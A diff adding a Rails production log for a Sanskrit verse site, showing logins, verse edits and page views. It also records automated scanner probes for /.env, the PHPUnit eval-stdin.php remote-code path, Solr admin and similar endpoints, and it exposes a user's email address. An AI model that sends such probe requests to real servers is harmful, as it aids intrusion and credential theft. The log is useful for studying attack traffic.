+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:157:in `accept_and_process_next_request'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler/thread_handler.rb:110:in `main_loop'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/request_handler.rb:415:in `block (3 levels) in start_threads'
+/usr/lib/ruby/vendor_ruby/phusion_passenger/utils.rb:113:in `block in create_thread_and_abort_on_exception'
+Started GET "/shlok/5" for 103.37.201.183 at 2022-01-05 14:10:02 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"5"}
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 2.0ms | Allocations: 934)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 13.5ms | Allocations: 7752)
+Completed 200 OK in 36ms (Views: 16.2ms | ActiveRecord: 7.2ms | Allocations: 16495)
+
+
+Started POST "/shlok/5" for 103.37.201.183 at 2022-01-05 14:10:05 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokup as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "title"=>"CONTRADICTORY MEANING", "shlok"=>"b", "translation"=>"c", "commit"=>"अग्रेस्थापनं करोतु", "id"=>"5"}
+  [1m[36mShlok Load (0.7ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 5], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:42:in `ashlokup'
+  [1m[36mTRANSACTION (0.8ms)[0m  [1m[35mBEGIN[0m
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+  [1m[36mShlok Update (1.2ms)[0m  [1m[33mUPDATE "shloks" SET "title" = $1 WHERE "shloks"."sid" = $2[0m  [["title", "CONTRADICTORY MEANING"], ["sid", 5]]
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+  [1m[36mTRANSACTION (1.4ms)[0m  [1m[35mCOMMIT[0m
+  ↳ app/controllers/shlok_controller.rb:43:in `ashlokup'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 11ms (ActiveRecord: 4.1ms | Allocations: 3816)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 14:10:05 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.7ms | Allocations: 1412)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 15.8ms | Allocations: 4396)
+Completed 200 OK in 17ms (Views: 15.7ms | ActiveRecord: 0.9ms | Allocations: 4962)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 14:14:01 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.3ms | Allocations: 1023)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.0ms | Allocations: 4007)
+Completed 200 OK in 9ms (Views: 7.8ms | ActiveRecord: 0.9ms | Allocations: 4422)
+
+
+Started GET "/" for 162.142.125.196 at 2022-01-05 14:15:39 +0000
+Cannot render console from 162.142.125.196! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 1.7ms | Allocations: 198)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 9.4ms | Allocations: 3413)
+Completed 200 OK in 18ms (Views: 13.8ms | ActiveRecord: 0.0ms | Allocations: 4571)
+
+
+Started GET "/" for 162.142.125.196 at 2022-01-05 14:15:40 +0000
+Cannot render console from 162.142.125.196! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.9ms | Allocations: 3042)
+Completed 200 OK in 10ms (Views: 9.5ms | ActiveRecord: 0.0ms | Allocations: 3628)
+
+
+Started GET "/.env" for 185.254.196.218 at 2022-01-05 15:00:10 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 185.254.196.218 at 2022-01-05 15:00:10 +0000
+Cannot render console from 185.254.196.218! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:04:34 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 23.1ms | Allocations: 4446)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 41.4ms | Allocations: 7571)
+Completed 200 OK in 43ms (Views: 42.1ms | ActiveRecord: 13.5ms | Allocations: 8048)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:04:54 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (1.1ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 14.6ms | Allocations: 5125)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 26.8ms | Allocations: 12043)
+Completed 200 OK in 37ms (Views: 23.0ms | ActiveRecord: 7.0ms | Allocations: 16032)
+
+
+Started GET "/logging/logout" for 103.37.201.183 at 2022-01-05 15:05:25 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#logout as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 449)
+
+
+Started GET "/" for 103.37.201.183 at 2022-01-05 15:05:25 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.4ms | Allocations: 195)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3438)
+Completed 200 OK in 11ms (Views: 8.4ms | ActiveRecord: 0.0ms | Allocations: 4661)
+
+
+Started GET "/logging/login" for 103.37.201.183 at 2022-01-05 15:05:27 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 1.5ms | Allocations: 743)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.9ms | Allocations: 3933)
+Completed 200 OK in 12ms (Views: 10.8ms | ActiveRecord: 0.0ms | Allocations: 5065)
+
+
+Started POST "/logging/loginp" for 103.37.201.183 at 2022-01-05 15:05:34 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (1.1ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 15ms (ActiveRecord: 6.0ms | Allocations: 4989)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:05:34 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 4.3ms | Allocations: 1063)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 9.0ms | Allocations: 4189)
+Completed 200 OK in 10ms (Views: 8.7ms | ActiveRecord: 1.0ms | Allocations: 4688)
+
+
+Started POST "/" for 135.125.217.54 at 2022-01-05 15:08:33 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-05 15:08:33 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:26:02 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (1.0ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 14.4ms | Allocations: 5121)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 48.3ms | Allocations: 26570)
+Completed 200 OK in 58ms (Views: 44.8ms | ActiveRecord: 6.8ms | Allocations: 30558)
+
+
+Started GET "/config/getuser?index=0" for 209.141.53.74 at 2022-01-05 15:31:54 +0000
+Cannot render console from 209.141.53.74! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/config/getuser"):
+  
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:46:39 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (0.9ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.5ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 19.0ms | Allocations: 5121)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 59.7ms | Allocations: 25795)
+Completed 200 OK in 73ms (Views: 55.5ms | ActiveRecord: 8.5ms | Allocations: 29783)
+
+
+Started GET "/shlok/ashlokc" for 103.37.201.183 at 2022-01-05 15:46:57 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 1.5ms | Allocations: 823)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.0ms | Allocations: 3967)
+Completed 200 OK in 8ms (Views: 6.9ms | ActiveRecord: 0.0ms | Allocations: 4633)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:46:58 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.2ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 4.0ms | Allocations: 1134)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 11.0ms | Allocations: 4162)
+Completed 200 OK in 12ms (Views: 10.4ms | ActiveRecord: 1.2ms | Allocations: 4583)
+
+
+Started GET "/shlok/4" for 103.37.201.183 at 2022-01-05 15:47:12 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashloku as HTML
+  Parameters: {"id"=>"4"}
+  [1m[36mShlok Load (0.8ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks" WHERE "shloks"."sid" = $1 LIMIT $2[0m  [["sid", 4], ["LIMIT", 1]]
+  ↳ app/controllers/shlok_controller.rb:34:in `ashloku'
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashloku.html.erb within layouts/application
+  Rendered shlok/ashloku.html.erb within layouts/application (Duration: 1.3ms | Allocations: 769)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.1ms | Allocations: 3886)
+Completed 200 OK in 23ms (Views: 7.9ms | ActiveRecord: 1.5ms | Allocations: 8017)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:47:23 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (0.9ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.0ms | Allocations: 1037)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 7.7ms | Allocations: 4065)
+Completed 200 OK in 9ms (Views: 7.2ms | ActiveRecord: 0.9ms | Allocations: 4516)
+
+
+Started GET "/shlok/ashlokc" for 103.37.201.183 at 2022-01-05 15:47:35 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokc as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokc.html.erb within layouts/application
+  Rendered shlok/ashlokc.html.erb within layouts/application (Duration: 0.6ms | Allocations: 423)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.7ms | Allocations: 3446)
+Completed 200 OK in 8ms (Views: 7.1ms | ActiveRecord: 0.0ms | Allocations: 3850)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 15:47:38 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 3.7ms | Allocations: 1021)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.4ms | Allocations: 4054)
+Completed 200 OK in 10ms (Views: 7.9ms | ActiveRecord: 1.0ms | Allocations: 4469)
+
+
+Started GET "/logging/logout" for 103.37.201.183 at 2022-01-05 15:47:41 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#logout as HTML
+Redirected to http://13.127.46.121/
+Completed 302 Found in 1ms (ActiveRecord: 0.0ms | Allocations: 448)
+
+
+Started GET "/" for 103.37.201.183 at 2022-01-05 15:47:41 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.4ms | Allocations: 196)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3490)
+Completed 200 OK in 7ms (Views: 6.1ms | ActiveRecord: 0.0ms | Allocations: 4712)
+
+
+Started POST "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" for 45.146.165.37 at 2022-01-05 15:51:22 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
+  
+Started GET "/" for 104.206.128.6 at 2022-01-05 15:58:00 +0000
+Cannot render console from 104.206.128.6! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.7ms | Allocations: 3245)
+Completed 200 OK in 7ms (Views: 6.2ms | Allocations: 3680)
+
+
+Started GET "/" for 103.37.201.183 at 2022-01-05 16:27:58 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (1.0ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 1.1ms | Allocations: 422)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 47.5ms | Allocations: 21617)
+Completed 200 OK in 60ms (Views: 50.5ms | ActiveRecord: 0.0ms | Allocations: 25306)
+
+
+Started GET "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" for 45.146.165.37 at 2022-01-05 16:31:54 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"):
+  
+Started GET "/" for 189.179.103.186 at 2022-01-05 16:40:02 +0000
+Cannot render console from 189.179.103.186! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.3ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3245)
+Completed 200 OK in 6ms (Views: 5.2ms | Allocations: 3682)
+
+
+Started GET "/logging/login" for 103.37.201.183 at 2022-01-05 16:44:11 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#login as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering logging/login.html.erb within layouts/application
+  Rendered logging/login.html.erb within layouts/application (Duration: 1.4ms | Allocations: 785)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 6.3ms | Allocations: 3996)
+Completed 200 OK in 9ms (Views: 7.8ms | Allocations: 5181)
+
+
+Started POST "/logging/loginp" for 103.37.201.183 at 2022-01-05 16:44:20 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by LoggingController#loginp as HTML
+  Parameters: {"authenticity_token"=>"[FILTERED]", "email"=>"mohak_k@ph.iitr.ac.in", "password"=>"[FILTERED]", "commit"=>"Log In"}
+  [1m[36mMember Load (0.9ms)[0m  [1m[34mSELECT "members".* FROM "members" WHERE "members"."email" = $1 LIMIT $2[0m  [["email", "mohak_k@ph.iitr.ac.in"], ["LIMIT", 1]]
+  ↳ app/controllers/logging_controller.rb:5:in `loginp'
+Redirected to http://13.127.46.121/shlok/ashlokr
+Completed 302 Found in 34ms (ActiveRecord: 18.6ms | Allocations: 8779)
+
+
+Started GET "/shlok/ashlokr" for 103.37.201.183 at 2022-01-05 16:44:20 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by ShlokController#ashlokr as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering shlok/ashlokr.html.erb within layouts/application
+  [1m[36mShlok Load (1.0ms)[0m  [1m[34mSELECT "shloks".* FROM "shloks"[0m
+  ↳ app/views/shlok/ashlokr.html.erb:13
+  Rendered shlok/ashlokr.html.erb within layouts/application (Duration: 12.9ms | Allocations: 4164)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 22.3ms | Allocations: 7418)
+Completed 200 OK in 25ms (Views: 18.7ms | ActiveRecord: 5.2ms | Allocations: 8903)
+
+
+Started GET "/solr/admin/info/system?wt=json" for 45.146.165.37 at 2022-01-05 17:03:21 +0000
+Cannot render console from 45.146.165.37! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  [1m[35m (2.0ms)[0m  [1m[34mSELECT "schema_migrations"."version" FROM "schema_migrations" ORDER BY "schema_migrations"."version" ASC[0m
+  
+ActionController::RoutingError (No route matches [GET] "/solr/admin/info/system"):
+  
+Started GET "/" for 103.37.201.183 at 2022-01-05 17:05:49 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.4ms | Allocations: 199)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 11.2ms | Allocations: 7092)
+Completed 200 OK in 16ms (Views: 12.7ms | ActiveRecord: 0.0ms | Allocations: 9834)
+
+
+Started POST "/" for 135.125.217.54 at 2022-01-05 17:08:52 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/.env" for 135.125.217.54 at 2022-01-05 17:08:52 +0000
+Cannot render console from 135.125.217.54! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/?pp=env" for 34.127.38.150 at 2022-01-05 17:10:02 +0000
+Cannot render console from 34.127.38.150! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Parameters: {"pp"=>"env"}
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 45)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.3ms | Allocations: 3247)
+Completed 200 OK in 7ms (Views: 5.8ms | Allocations: 3824)
+
+
+Started GET "/.env" for 185.254.196.217 at 2022-01-05 17:20:46 +0000
+Cannot render console from 185.254.196.217! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started POST "/" for 185.254.196.217 at 2022-01-05 17:20:48 +0000
+Cannot render console from 185.254.196.217! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [POST] "/"):
+  
+Started GET "/" for 103.37.201.183 at 2022-01-05 17:22:11 +0000
+Cannot render console from 103.37.201.183! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.0ms | Allocations: 3109)
+Completed 200 OK in 6ms (Views: 5.5ms | Allocations: 3487)
+
+
+Started GET "/?pp=env" for 114.142.168.49 at 2022-01-05 17:29:03 +0000
+Cannot render console from 114.142.168.49! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as HTML
+  Parameters: {"pp"=>"env"}
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.9ms | Allocations: 3470)
+
+
+Started GET "/" for 128.14.133.58 at 2022-01-05 17:29:16 +0000
+Cannot render console from 128.14.133.58! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 4.7ms | Allocations: 3093)
+Completed 200 OK in 6ms (Views: 5.3ms | Allocations: 3480)
+
+
+Started GET "/" for 31.220.3.140 at 2022-01-05 17:55:20 +0000
+Cannot render console from 31.220.3.140! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 8.2ms | Allocations: 3093)
+Completed 200 OK in 10ms (Views: 9.0ms | Allocations: 3479)
+
+
+Started GET "/.env" for 2.56.57.23 at 2022-01-05 18:08:24 +0000
+Cannot render console from 2.56.57.23! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/.env" for 2.56.57.23 at 2022-01-05 18:08:25 +0000
+Cannot render console from 2.56.57.23! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+  
+ActionController::RoutingError (No route matches [GET] "/.env"):
+  
+Started GET "/" for 192.241.217.190 at 2022-01-05 18:25:48 +0000
+Cannot render console from 192.241.217.190! Allowed networks: 127.0.0.0/127.255.255.255, ::1
+Processing by WelcomeController#home as */*
+  Rendering layout layouts/application.html.erb
+  Rendering welcome/home.html.erb within layouts/application
+  Rendered welcome/home.html.erb within layouts/application (Duration: 0.1ms | Allocations: 43)
+[Webpacker] Everything's up-to-date. Nothing to do
+  Rendered layout layouts/application.html.erb (Duration: 5.8ms | Allocations: 3109)
+Completed 200 OK in 7ms (Views: 6.8ms | Allocations: 3496)
+
+
